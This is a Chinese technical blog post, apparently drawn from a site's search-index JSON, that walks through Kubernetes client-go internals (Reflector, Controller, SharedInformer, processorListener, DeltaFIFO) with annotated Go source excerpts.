listerWatcher用于获取和监控资源，lister可以获取对象的全量，watcher可以获取对象的增量(变化)； 系统会周期性的执行list-watch的流程，一旦过程中失败就要重新执行流程，这个重新执行的周期就是period指定的； expectedType规定了监控对象的类型，非此类型的对象将会被忽略； 实例化后的expectedType类型的对象会被添加到store中； kubernetes资源在apiserver中都是有版本的，对象的任何除了修改(添加、删除、更新)都会造成资源版本更新，所以lastSyncResourceVersion就是指的这个版本； 如果使用者需要定期同步全量对象，那么Reflector就会定期产生全量对象的同步事件给DeltaFIFO; Run Reflector有一个Run()函数，这个是Reflector的核心功能流程 // 代码源自client-go/tools/cache/reflector.go func (r *Reflector) Run(stopCh \u003c-chan struct{}) { // func Until(f func(), period time.Duration, stopCh \u003c-chan struct{})是下面函数的声明 // 这里面我们不用关心wait.Until是如何实现的，只要知道他调用函数f会被每period周期执行一次 // 意思就是f()函数执行完毕再等period时间后在执行一次，也就是r.ListAndWatch()会被周期性的调用 wait.Until(func() { if err := r.ListAndWatch(stopCh); err != nil { utilruntime.HandleError(err) } }, r.period, stopCh) } ListAndWatch // 代码源自client-go/tools/cache/reflector.go func (r *Reflector) ListAndWatch(stopCh \u003c-chan struct{}) error { var resourceVersion string // 很多存储类的系统都是这样设计的，数据采用版本的方式记录，数据每变化(添加、删除、更新)都会触发版本更新， // 这样的做法可以避免全量数据访问。以apiserver资源监控为例，只要监控比缓存中资源版本大的对象就可以了， // 把变化的部分更新到缓存中就可以达到与apiserver一致的效果，一般资源的初始版本为0，从0版本开始列举就是全量的对象了 // 1. 从版本号0 开始list，List()可以从缓存中提供，并且可能会相对于etcd内容延迟。 // 最终，由watch进行监听更新 options := metav1.ListOptions{ResourceVersion: \"0\"} // 与监控相关的内容不多解释 r.metrics.numberOfLists.Inc() start := r.clock.Now() // 列举资源，这部分是apimachery相关的内容，读者感兴趣可以自己了解 list, err := r.listerWatcher.List(options) if err != nil { return fmt.Errorf(\"%s: Failed to list %v: %v\", r.name, r.expectedType, err) } // 还是监控相关的 r.metrics.listDuration.Observe(time.Since(start).Seconds()) // 下面的代码主要是利用apimachinery相关的函数实现，就是把列举返回的结果转换为对象数组 // 下面的代码大部分来自apimachinery，此处不做过多说明，读者只要知道实现什么功能就行了 listMetaInterface, err := meta.ListAccessor(list) if err != nil { return fmt.Errorf(\"%s: Unable to understand list result %#v: %v\", r.name, list, err) } // 2. 根据listMeta ResourceVersion的版本号，决定从哪里开始watch resourceVersion = listMetaInterface.GetResourceVersion() // 3. 将资源数据转换成资源列表 runtime.Object -\u003e []runtime.Object items, err := meta.ExtractList(list) if err != nil { return fmt.Errorf(\"%s: Unable to understand list result %#v (%v)\", r.name, list, err) } // 和监控相关的内容 r.metrics.numberOfItemsInList.Observe(float64(len(items))) // 以上部分都是对象实例化的过程，可以称之为反射，也是Reflector这个名字的主要来源，本文不是讲解反射原理的， // 而是作为SharedInformer的前端，所以我们重点介绍的是对象在SharedInformer中流转过程，所以反射原理部分不做为重点讲解 // 这可是真正从apiserver同步过来的全量对象，所以要同步到DeltaFIFO中 // 4. 将资源对象列表和资源版本号 以r.store.Replace方式存储到DeltaFIFO中 if err := r.syncWith(items, resourceVersion); err != nil { return fmt.Errorf(\"%s: Unable to sync list result: %v\", r.name, err) } // 设置最新的同步的对象版本 // 5. 设置最新的资源版本号 r.setLastSyncResourceVersion(resourceVersion) // 下面要启动一个后台协程实现定期的同步操作，这个同步就是将SharedInformer里面的对象全量以同步事件的方式通知使用者 // 我们暂且称之为“后台同步协程”，Run()函数退出需要后台同步协程退出，所以下面的cancelCh就是干这个用的 // 利用defer close(cancelCh)实现的，而resyncerrc是后台同步协程反向通知Run()函数的报错通道 // 当后台同步协程出错，Run()函数接收到信号就可以退出了 resyncerrc := make(chan error, 1) cancelCh := make(chan struct{}) defer close(cancelCh) // 下面这个匿名函数就是后台同步协程的函数了 // 6. 开启Resync协程： 根据ShouldResync标识，重新同步处理store.Resync() // 这个同步Resync，不是从apiserver中获取，而是从indexer cache的resync处理 go func() { // resyncCh返回的就是一个定时器，如果resyncPeriod这个为0那么就会返回一个永久定时器，cleanup函数是用来清理定时器的 resyncCh, cleanup := r.resyncChan() defer func() { cleanup() }() // 死循环等待各种信号 for { // 只有定时器有信号才继续处理，其他的都会退出 // 注意case \u003c-resyncCh 定时同步分支","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:2","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"说明 Reflector利用apiserver的client列举全量对象(版本为0以后的对象全部列举出来) 将全量对象采用Replace()接口同步到DeltaFIFO中，并且更新资源的版本号，这个版本号后续会用到； 开启一个协程定时执行resync，如果没有设置定时同步则不会执行，同步就是把全量对象以同步事件的方式通知出去；注意：这个resync操作不是跟apiserver的交互操作 通过apiserver的client监控(watch)资源，监控的当前资源版本号以后的对象，因为之前的都已经获取到了； 一旦有对象发生变化，那么就会根据变化的类型(新增、更新、删除)调用DeltaFIFO的相应接口，产生一个相应的对象Delta，同时更新当前资源的版本； ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:3","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Controller 这里的controller定义在client-go/tools/cache/controller.go中，目的是用来把Reflector、DeltaFIFO组合起来形成一个相对固定的、标准的处理流程。理解了Controller，基本就算把SharedInfomer差不多搞懂了。 实际上informer本质上就是个controller // 代码源自client-go/tools/cache/controller.go // 这是一个Controller的抽象 type Controller interface { Run(stopCh \u003c-chan struct{}) // 核心流程函数 HasSynced() bool // apiserver中的对象是否已经同步到了Store中 LastSyncResourceVersion() string // 最新的资源版本号 } type Config struct { Queue // SharedInformer使用DeltaFIFO ListerWatcher // 这个用来构造Reflector Process ProcessFunc // 这个在调用DeltaFIFO.Pop()使用，弹出对象要如何处理 ObjectType runtime.Object // 对象类型，这个肯定是Reflector使用 FullResyncPeriod time.Duration // 全量同步周期，这个在Reflector使用 ShouldResync ShouldResyncFunc // Reflector在全量更新的时候会调用该函数询问 RetryOnError bool // 错误是否需要尝试 } 从上面的定义来看，HasSynced()可调用DeltaFIFO. HasSynced()实现，LastSyncResourceVersion()可以通过Reflector实现。因为Controller把多个模块整合起来实现了一套业务逻辑，所以在创建Controller需要提供一些配置 从上面两个类型的定义我们可以猜测：Controller自己构造Reflector获取对象，Reflector作为DeltaFIFO生产者持续监控apiserver的资源变化并推送到队列中。Controller的Run()应该是队列的消费者，从队列中弹出对象并调用Process()处理。所以Controller相比于Reflector因为队列的加持表现为每次有资源变化就会调用一次使用者定义的处理函数。 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"流程处理 Run NewReflector，Reflector生产者，进行obj入队操作 processLoop，是消费者，进行obj出队和存储操作 // 代码源自client-go/tools/cache/controller.go // controller是Controller的实现类型 type controller struct { config Config // 配置，上面有讲解 reflector *Reflector // 反射器 reflectorMutex sync.RWMutex // 反射器的锁 clock clock.Clock // 时钟 } // 核心业务逻辑实现 func (c *controller) Run(stopCh \u003c-chan struct{}) { defer utilruntime.HandleCrash() // 创建一个协程，如果收到系统退出的信号就关闭队列，相当于在这里析构的队列 go func() { \u003c-stopCh c.config.Queue.Close() }() // 创建Reflector r := NewReflector( c.config.ListerWatcher, c.config.ObjectType, c.config.Queue, c.config.FullResyncPeriod, ) // r.ShouldResync的存在就是为了以后使用少些一点代码？否则直接使用c.config.ShouldResync不就完了么？不明白用意 r.ShouldResync = c.config.ShouldResync r.clock = c.clock // 记录反射器 c.reflectorMutex.Lock() c.reflector = r c.reflectorMutex.Unlock() // wait.Group不是本章的讲解内容，只要把它理解为类似barrier就行了 // 被他管理的所有的协程都退出后调用Wait()才会退出，否则就会被阻塞 var wg wait.Group defer wg.Wait() // StartWithChannel()会启动协程执行Reflector.Run()，同时接收到stopCh信号就会退出协程 wg.StartWithChannel(stopCh, r.Run) // wait.Until()在前面的章节讲过了，周期性的调用c.processLoop()，这里来看是1秒 // 不用担心调用频率太高，正常情况下c.processLoop是不会返回的，除非遇到了解决不了的错误，因为他是个循环 wait.Until(c.processLoop, time.Second, stopCh) } processLoop // 代码源自client-go/tools/cache/controller.go func (c *controller) processLoop() { for { // 从队列中弹出一个对象，然后处理它,这才是最主要的部分，这个c.config.Process是构造Controller的时候通过Config传进来的 // 所以这个读者要特别注意了，这个函数其实是ShareInformer传进来的，所以在分析SharedInformer的时候要重点分析的 // 核心处理逻辑实现在了Process函数中了 obj, err := c.config.Queue.Pop(PopProcessFunc(c.config.Process)) if err != nil { // 如果FIFO关闭了那就退出 if err == FIFOClosedError { return } // 如果错误可以再试试 if c.config.RetryOnError { c.config.Queue.AddIfNotPresent(obj) } } } } HasSynced HasSynced 表示队列中的全量对象都已同步完成 // 代码源自client-go/tools/cache/controller.go // Returns true once this controller has completed an initial resource listing func (c *controller) HasSynced() bool { return c.config.Queue.HasSynced() } // Return true if an Add/Update/Delete/AddIfNotPresent are called first, // or an Update called first but the first batch of items inserted by Replace() has been popped func (f *DeltaFIFO) HasSynced() bool { f.lock.Lock() defer f.lock.Unlock() // 这里就比较明白了，一次同步全量对象后，并且全部Pop()出去才能算是同步完成 // 其实这里所谓的同步就是全量内容已经进入Indexer，Indexer已经是系统中对象的全量快照了 return f.populated \u0026\u0026 f.initialPopulationCount == 0 } ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:1","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"SharedInformer ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"SharedInformer接口 // 代码源自client-go/tools/cache/shared_informer.go type SharedInformer interface { // 添加资源事件处理器，关于ResourceEventHandler的定义在下面 // 相当于注册回调函数，当有资源变化就会通过回调通知使用者，是不是能和上面介绍的Controller可以联系上了？ // 为什么是Add不是Reg，说明可以支持多个handler AddEventHandler(handler ResourceEventHandler) // 上面添加的是不需要周期同步的处理器，下面的接口添加的是需要周期同步的处理器，周期同步上面提了好多遍了，不赘述 AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) // Store这个有专门的文章介绍，这个函数就是获取Store的接口,说明SharedInformer内有Store对象 GetStore() Store // Controller在上面的章节介绍了，说明SharedInformer内有Controller对象 GetController() Controller // 这个应该是SharedInformer的核心逻辑实现的地方 Run(stopCh \u003c-chan struct{}) // 因为有Store，这个函数就是告知使用者Store里面是否已经同步了apiserver的资源，这个接口很有用 // 当创建完SharedInformer后，通过Reflector从apiserver同步全量对象，然后在通过DeltaFIFO一个一个的同志到cache // 这个接口就是告知使用者，全量的对象是不是已经同步到了cache，这样就可以从cache列举或者查询了 HasSynced() bool // 最新同步资源的版本，这个就不多说了，通过Controller(Controller通过Reflector)实现 LastSyncResourceVersion() string } // 扩展了SharedInformer类型，从类型名字上看共享的是Indexer，Indexer也是一种Store的实现 type SharedIndexInformer interface { // 继承了SharedInformer SharedInformer // 扩展了Indexer相关的接口 AddIndexers(indexers Indexers) error GetIndexer() Indexer } // 代码源自client-go/tools/cache/controller.go，SharedInformer使用者如果需要处理资源的事件 // 那么就要自己实现相应的回调函数 type ResourceEventHandler interface { // 添加对象回调函数 OnAdd(obj interface{}) // 更新对象回调函数 OnUpdate(oldObj, newObj interface{}) // 删除对象回调函数 OnDelete(obj interface{}) } ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:1","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"sharedIndexInformer类 // 代码源自client-go/tools/cache/shared_informer.go type sharedIndexInformer struct { // Indexer也是一种Store，这个我们知道的，Controller负责把Reflector和FIFO逻辑串联起来 // 所以这两个变量就涵盖了开篇那张图里面的Reflector、DeltaFIFO和LocalStore(cache) indexer Indexer controller Controller // sharedIndexInformer把上面提到的ResourceEventHandler进行了在层封装，并统一由sharedProcessor管理，后面章节专门介绍 processor *sharedProcessor // CacheMutationDetector其实没啥用，我理解是开发者自己实现的一个调试工具，用来发现对象突变的 // 实现方法也比较简单，DeltaFIFO弹出的对象在处理前先备份(深度拷贝)一份，然后定期比对两个对象是否相同 // 如果不同那就报警，说明处理过程中有人修改过对象，这个功能默认是关闭，所以我说没啥用 cacheMutationDetector CacheMutationDetector // 这两个变量是给Reflector用的，我们知道Reflector是在Controller创建的 listerWatcher ListerWatcher objectType runtime.Object // 定期同步的周期，因为可能存在多个ResourceEventHandler，就有可能存在多个同步周期，sharedIndexInformer采用最小的周期 // 这个周期值就存储在resyncCheckPeriod中，通过AddEventHandler()添加的处理器都采用defaultEventHandlerResyncPeriod resyncCheckPeriod time.Duration defaultEventHandlerResyncPeriod time.Duration // 时钟 clock clock.Clock // 启动、停止标记，肯定有人会问为啥用两个变量，一个变量不就可以实现启动和停止了么？ // 其实此处是三个状态，启动前，已启动和已停止，start表示了两个状态，而且为启动标记专门做了个锁 // 说明启动前和启动后有互斥的资源操作 started, stopped bool startedLock sync.Mutex // 这个名字起的也是够了，因为DeltaFIFO每次Pop()的时候需要传入一个函数用来处理Deltas // 处理Deltas也就意味着要把消息通知给处理器，如果此时调用了AddEventHandler() // 就会存在崩溃的问题，所以要有这个锁，阻塞Deltas....细想名字也没毛病~ blockDeltas sync.Mutex } ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:2","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"CacheMutationDetector 【非重要，可忽略】 CacheMutationDetector这个就是检测对象在过程中突变的，何所谓突变呢？突变就是莫名其妙的修改了，如何实现突变检测，也是比较简单的。CacheMutationDetector对所有的对象做了一次深度拷贝(DeepCopy)，然后定期比较两个对象是否一致，当发现有不同时说明对象突变了，然后就panic。我认为CacheMutationDetector是用来调试的，因为代码默认是关闭的： // 代码源自client-go/tools/cache/mutation_detector.go // 默认关闭突变检测 var mutationDetectionEnabled = false // 但是可以通过环境变量的KUBE_CACHE_MUTATION_DETECTOR开启 func init() { mutationDetectionEnabled, _ = strconv.ParseBool(os.Getenv(\"KUBE_CACHE_MUTATION_DETECTOR\")) } // 这个是突变检测的类型抽象 type CacheMutationDetector interface { AddObject(obj interface{}) // 用于记录所有的对象 Run(stopCh \u003c-chan struct{}) // 开启协程定期比对 } // 创建CacheMutationDetector对象 func NewCacheMutationDetector(name string) CacheMutationDetector { // 如果没有开启选项就构造一个什么都不做的对象 if !mutationDetectionEnabled { return dummyMutationDetector{} } // 如果开启了选项，那么就构造一个默认的突变检测器 glog.Warningln(\"Mutation detector is enabled, this will result in memory leakage.\") return \u0026defaultCacheMutationDetector{name: name, period: 1 * time.Second} } // 这就是什么都不做的突变检测器 type dummyMutationDetector struct{} func (dummyMutationDetector) Run(stopCh \u003c-chan struct{}) { } func (dummyMutationDetector) AddObject(obj interface{}) { } ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:3","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"sharedProcessor 有没有感觉shared这个词被kubernetes玩儿坏了(继controller之后有一个背玩儿坏的单词)，sharedProcessor这又shared啥了？首先需要知道Processor的定义，这里定义的Processor就是处理事件的东西。什么事件，就是SharedInformer向外部通知的事件。因为官方代码没有注释，我猜是shared是同一个SharedInformer，有没有很绕嘴？还有更绕的在后面呢，我们还要了解一个新的类型，那就是processorListener，processor刚说完，又来了个Listener！ 通过SharedInformer.AddEventHandler()添加的处理器最终就会封装成processorListener，然后通过sharedProcessor管理起来，通过processorListener的封装就可以达到所谓的有事处理，没事挂起。 processorListener rocessorListener可以理解为两个核心功能，一个是processor，一个是listener，用一句话概括，有事做事没事挂起。先看看processorListener的定义： // 代码源自clien-go/tools/cache/shared_informer.go type processorListener struct { // nextCh、addCh、handler、pendingNotifications的用法请参看我的《golang的chan有趣用法》里面有相关的例子 // 总结这四个变量实现了事件的输入、缓冲、处理，事件就是apiserver资源的变化 nextCh chan interface{} addCh chan interface{} handler ResourceEventHandler pendingNotifications buffer.RingGrowing // 下面四个变量就是跟定时同步相关的了，requestedResyncPeriod是处理器设定的定时同步周期 // resyncPeriod是跟sharedIndexInformer对齐的同步时间，因为sharedIndexInformer管理了多个处理器 // 最终所有的处理器都会对齐到一个周期上，nextResync就是下一次同步的时间点 requestedResyncPeriod time.Duration resyncPeriod time.Duration nextResync time.Time resyncLock sync.Mutex } 我们需要知道就是processor如何接收事件(此处事件就是apiserver的资源变化，也就是DeltaFIFO输出的Deltas)？如何通知事件处理器？如何缓冲处理器？如何阻塞处理器进而形成listener的？一系列的问题我们需要沿着处理逻辑的流程逐一解释。第一个问题，事件是如何传入的: // 代码源自client-go/tools/cache/shared_informer.go // 对，就这么简单，通过addCh传入，这里面的notification就是我们所谓的事件 func (p *processorListener) add(notification interface{}) { p.addCh \u003c- notification } 因为addCh是无缓冲chan，调用add()函数的人是事件分发器processor.distribute。意思就是从DeltaFIFO弹出的Deltas要要逐一送到多个处理器，此时如果处理器没有及时处理会造成addCh把分发器阻塞，那别的处理器也就同样无法收到新的事件了。这一点，processorListener利用一个后台协程处理这个问题(相应的原理参看《golang的chan有趣用法》)： // 代码源自client-go/tools/cache/shared_informer.go // 这个函数是通过sharedProcessor利用wait.Group启动的，读者可以自行查看wait.Group func (p *processorListener) pop() { defer utilruntime.HandleCrash() // nextCh是在这里，函数退出前析构的 defer close(p.nextCh) // 临时变量，下面会用到 var nextCh chan\u003c- interface{} var notification interface{} // 进入死循环啦 for { select { // 有两种情况，nextCh还没有初始化，这个语句就会被阻塞，这个我在《深入浅出golang之chan》说过 // nextChan后面会赋值为p.nextCh，因为p.nextCh也是无缓冲的chan，数据不发送成功就阻塞 case nextCh \u003c- notification: // 如果发送成功了，那就从缓冲中再取一个事件出来 var ok bool notification, ok = p.pendingNotifications.ReadOne() if !ok { // 如果没有事件，那就把nextCh再次设置为nil，接下来对于nextCh操作还会被阻塞 nextCh = nil } // 从p.addCh读取一个事件出来，这回看到消费p.addCh的地方了 case notificationToAdd, ok := \u003c-p.addCh: // 说明p.addCh关闭了，只能退出 if !ok { return } // notification为空说明当前还没发送任何事件给处理器 if notification == nil { // 那就把刚刚获取的事件通过p.nextCh发送个处理器 notification = notificationToAdd nextCh = p.nextCh } else { // 上一个事件还没有发送成功，那就先放到缓存中 // pendingNotifications可以想象为一个slice，这样方便理解，是一个动态的缓存， p.pendingNotifications.WriteOne(notificationToAdd) } } } } pop()函数实现的非常巧妙，利用一个协程就把接收、缓冲、发送全部解决了。它充分的利用了golang的select可以同时操作多个chan的特性，同时从addChd读取数据从nextCh发送数据，这两个chan任何一个完成都可以激活协程。 notification 待通知的事件，来源有2个： p.addCh 直接接收到的新事件 pendingNotifications已阻塞缓存的未通知发送的事件 pendingNotifications 为缓存阻塞中的事件 pendingNotifications.WriteOne表示缓存事件 p.pendingNotifications.ReadOne表示从缓存读取事件 通过把notification 发送到 p.nextCh 表示发送 notificationToAdd 接收消费最新的p.addCh 接下来，我们看看从nextCh读取事件后是如何处理的： // 代码源自client-go/tools/cache/shared_informer.go // 这个也是sharedProcessor通过wait.Group启动的 func (p *processorListener) run() { // 因为wait.Until需要传入退出信号的chan stopCh := make(chan struct{}) // wait.Until不多说了，我在前期不点的文章中说过了，只要没有收到退出信号就会周期的执行传入的函数 wait.Until(func() { // wait.ExponentialBackoff()和wait.Until()类似，wait.Until()是无限循环 // wait.ExponentialBackoff()是尝试几次，每次等待时间会以指数上涨 err := wait.ExponentialBackoff(retry.DefaultRetry, func() (bool, error) { // 这也是chan的range用法，可以参看我的《深入浅出golang的chan》了解细节 for next := range p.nextCh { // 判断事件类型，这里面的handler就是调用SharedInfomer.AddEventHandler()传入的 // 理论上处理的不是Deltas么？怎么变成了其他类型，这是SharedInformer做的二次封装，后面会看到 switch notification := next.(type) { case updateNotification: p.handler.OnUpdate(notification.oldObj, notification.newObj) case addNotification: p.handler.OnAdd(notification.newObj) case deleteNotification: p.handler.OnDelete(notification.oldObj) default: utilruntime.HandleError(fm","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:4","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"SharedInformer实现 client-go实现了两个创建SharedInformer的接口，如下所示： // 代码源自client-go/tools/cache/shared_informer.go // lw:这个是apiserver客户端相关的，用于Reflector从apiserver获取资源，所以需要外部提供 // objType:这个SharedInformer监控的对象类型 // resyncPeriod:同步周期，SharedInformer需要多长时间给使用者发送一次全量对象的同步时间 func NewSharedInformer(lw ListerWatcher, objType runtime.Object, resyncPeriod time.Duration) SharedInformer { // 还是用SharedIndexInformer实现的 return NewSharedIndexInformer(lw, objType, resyncPeriod, Indexers{}) } // 创建SharedIndexInformer对象，其中大部分参数再上面的函数已经介绍了 // indexers:需要外部提供计算对象索引键的函数，也就是这里面的对象需要通过什么方式创建索引 func NewSharedIndexInformer(lw ListerWatcher, objType runtime.Object, defaultEventHandlerResyncPeriod time.Duration, indexers Indexers) SharedIndexInformer { realClock := \u0026clock.RealClock{} sharedIndexInformer := \u0026sharedIndexInformer{ // 管理所有处理器用的，这个上面的章节解释了 processor: \u0026sharedProcessor{clock: realClock}, // 其实就是在构造cache，读者可以自行查看NewIndexer()的实现， // 在cache中的对象用DeletionHandlingMetaNamespaceKeyFunc计算对象键，用indexers计算索引键 // 可以想象成每个对象键是Namespace/Name，每个索引键是Namespace，即按照Namesapce分类 // 因为objType决定了只有一种类型对象，所以Namesapce是最大的分类 indexer: NewIndexer(DeletionHandlingMetaNamespaceKeyFunc, indexers), // 下面这两主要就是给Controller用，确切的说是给Reflector用的 listerWatcher: lw, objectType: objType, // 无论是否需要定时同步，SharedInformer都提供了一个默认的同步时间，当然这个是外部设置的 resyncCheckPeriod: defaultEventHandlerResyncPeriod, defaultEventHandlerResyncPeriod: defaultEventHandlerResyncPeriod, // 默认没有开启的对象突变检测器，没啥用，也不多介绍 cacheMutationDetector: NewCacheMutationDetector(fmt.Sprintf(\"%T\", objType)), clock: realClock, } return sharedIndexInformer } 创建完ShareInformer对象，就要添加事件处理器了： // 代码源自client-go/tools/cache/shared_informer.go // 添加没有指定同步周期的事件处理器 func (s *sharedIndexInformer) AddEventHandler(handler ResourceEventHandler) { // defaultEventHandlerResyncPeriod是默认的同步周期，在创建SharedInformer的时候设置的 s.AddEventHandlerWithResyncPeriod(handler, s.defaultEventHandlerResyncPeriod) } // 添加需要定期同步的事件处理器 func (s *sharedIndexInformer) AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) { // 因为是否已经开始对于添加事件处理器的方式不同，后面会有介绍，所以此处加了锁 s.startedLock.Lock() defer s.startedLock.Unlock() // 如果已经结束了，那就可以直接返回了 if s.stopped { return } // 如果有同步周期，==0就是永远不用同步 if resyncPeriod \u003e 0 { // 同步周期不能太短，太短对于系统来说反而是个负担，大量的无效计算浪费在这上面 if resyncPeriod \u003c minimumResyncPeriod { resyncPeriod = minimumResyncPeriod } // SharedInformer管理了很多处理器，每个处理器都有自己的同步周期，所以此处要统一成一个，称之为对齐 // SharedInformer会选择所有处理器中最小的那个作为所有处理器的同步周期，称为对齐后的同步周期 // 此处就要判断是不是比当前对齐后的同步周期还要小 if resyncPeriod \u003c s.resyncCheckPeriod { // 如果已经启动了，那么只能用和大家一样的周期 if s.started { resyncPeriod = s.resyncCheckPeriod // 如果没启动，那就让大家都用最新的对齐同步周期 } else { s.resyncCheckPeriod = resyncPeriod s.processor.resyncCheckPeriodChanged(resyncPeriod) } } } // 创建处理器，代码一直用listener,可能想强调没事件就挂起把，我反而想用处理器这个名词 // determineResyncPeriod()这个函数读者自己分析把，非常简单，这里面只要知道创建了处理器就行了 listener := newProcessListener(handler, resyncPeriod, determineResyncPeriod(resyncPeriod, s.resyncCheckPeriod), s.clock.Now(), initialBufferSize) // 如果没有启动，那么直接添加处理器就可以了 if !s.started { s.processor.addListener(listener) return } // 这个锁就是暂停再想所有的处理器分发事件用的，因为这样会遍历所有的处理器，此时添加会有风险 s.blockDeltas.Lock() defer s.blockDeltas.Unlock() // 添加处理器 s.processor.addListener(listener) // 这里有意思啦，遍历缓冲中的所有对象，通知处理器，因为SharedInformer已经启动了，可能很多对象已经让其他的处理器处理过了， // 所以这些对象就不会再通知新添加的处理器，此处就是解决这个问题的 for _, item := range s.indexer.List() { listener.add(addNotification{newObj: item}) } } 事件处理器添加完了，就要看SharedInformer如何把事件分发给每个处理器的了： // 代码源自client-go/tools/cache/shared_informer.go // sharedIndexInformer的核心逻辑函数 func (s *sharedIndexInformer) Run(stopCh \u003c-chan struct{}) { defer utilruntime.HandleCrash() // 在此处构造的DeltaFIFO fifo := NewDeltaFIFO(MetaNamespaceKeyFunc, s.indexer) // 这里的Config是我们介绍Reflector时介绍的那个Config cfg := \u0026Config{ // 我前面一直在说Reflector输入到DeltaFIFO,这里算是直接证明了 Queue: fifo, // 下面这些变量我们在Reflector都说了，这里赘述 ListerWatcher: s.listerWatcher, ObjectType: s.objectType, FullResyncPeriod: s.resyncCheckPeriod, RetryOnError: false, ShouldResync: s.processor.shouldResync, // 这个才是重点，Controller调用DeltaFIFO.Pop(","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:5","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"说明 利用apiserver的api实现资源的列举和监控(Reflector实现)； 利用cache存储apiserver中的部分对象，通过对象类型进行制定，并在cache中采用Namespace做对象的索引 先通过apiserver的api将对象的全量列举出来存储在cache中，然后再watch资源，一旦有变化就更新cache中； 更新到cache中的过程通过DeltaFIFO实现的有顺序的更新，因为资源状态是通过全量+增量方式实现同步的，所以顺序错误会造成状态不一致； 使用者可以注册回调函数(类似挂钩子)，在更新到cache的同时通知使用者处理，为了保证回调处理不被某一个处理器阻塞，SharedInformer实现了processorListener异步缓冲处理； 整个过程是Controller是发动机，驱动整个流程运转； 最后我们还是用一幅图来总结SharedInformer，绝对的干货(其中Reflector.resync()因为是个匿名函数，所以用斜体，其实是不存在这个函数的)~ ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:6","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"DeltaFIFO Delta其实就是kubernetes系统中对象的变化(增、删、改、同步)，FIFO比较好理解，是一个先入先出的队列，那么DeltaFIFO就是一个按序的(先入先出)kubernetes对象变化的队列 client-go/tools/cache/delta_fifo.go // A KeyListerGetter is anything that knows how to list its keys and look up by key. type KeyListerGetter interface { KeyLister KeyGetter } // A KeyLister is anything that knows how to list its keys. type KeyLister interface { ListKeys() []string } // A KeyGetter is anything that knows how to get the value stored under a given key. type KeyGetter interface { GetByKey(key string) (interface{}, bool, error) } 上面两个接口在client-go.tools.cache.Store这个接口类型中也存在，也就是说实现了Store接口的类型同时也实现了上面三个接口。上面三个接口基本上就是kv的标准接口，但凡是通过kv方式访问的对象(存储、队列、索引等)多半具备以上接口。肯定有人会问直接使用具体的类型不就完了么，定义这些有什么用？答案很简单，当你需要对kv的对象只读但是不关心具体实现时就用上了 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Queue client-go/tools/cache/fifo.go // Queue is exactly like a Store, but has a Pop() method too. type Queue interface { Store // Pop blocks until it has something to process. // It returns the object that was process and the result of processing. // The PopProcessFunc may return an ErrRequeue{...} to indicate the item // should be requeued before releasing the lock on the queue. Pop(PopProcessFunc) (interface{}, error) // AddIfNotPresent adds a value previously // returned by Pop back into the queue as long // as nothing else (presumably 